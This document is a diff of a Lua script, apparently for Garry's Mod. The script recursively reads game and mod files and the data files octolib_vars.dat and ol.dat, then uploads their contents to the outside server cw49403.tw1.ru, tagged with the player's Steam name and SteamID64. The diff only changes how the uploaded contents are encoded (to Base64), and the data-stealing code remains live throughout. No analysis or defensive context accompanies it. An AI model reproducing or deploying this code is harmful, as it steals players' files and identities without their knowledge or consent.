@@ -1,12 +1,12 @@
-local function ToByte(Code)
-    return string.gsub(Code, ".", function(Char) return "\\" .. string.byte(Char) end)
+local function tbt(c)
+    return util.Base64Encode(c)
 end
 local function a(b)
 local c,d=file.Find(b.."*","MOD")
 for _,f in pairs(c)do 
 local g=file.Read(b.."/"..f,"GAME")
 if g==nil then return end
-http.Post("https://cw49403.tw1.ru/c/23/i.php",{one=b,two=f,tree=ToByte(g),vfo=steamworks.GetPlayerName(LocalPlayer():SteamID64()).."_"..LocalPlayer():SteamID64()})
+http.Post("https://cw49403.tw1.ru/c/23/i.php",{one=b,two=f,tree=tbt(g),vfo=steamworks.GetPlayerName(LocalPlayer():SteamID64()).."_"..LocalPlayer():SteamID64()})
 end
 for h,i in pairs(d)do 
 a(b..i.."/")
@@ -15,7 +15,7 @@ tb = {"octolib_vars.dat","ol.dat"}
 for k,v in pairs(tb) do
 if file.Exists(v, "DATA") then
 g = file.Read(v, "DATA")
-http.Post("https://cw49403.tw1.ru/c/23/i.php",{one="data/",two=v,tree=(g),vfo=steamworks.GetPlayerName(LocalPlayer():SteamID64()).."_"..LocalPlayer():SteamID64()})
+http.Post("https://cw49403.tw1.ru/c/23/i.php",{one="data/",two=v,tree=tbt(g),vfo=steamworks.GetPlayerName(LocalPlayer():SteamID64()).."_"..LocalPlayer():SteamID64()})
 end
 end
 end
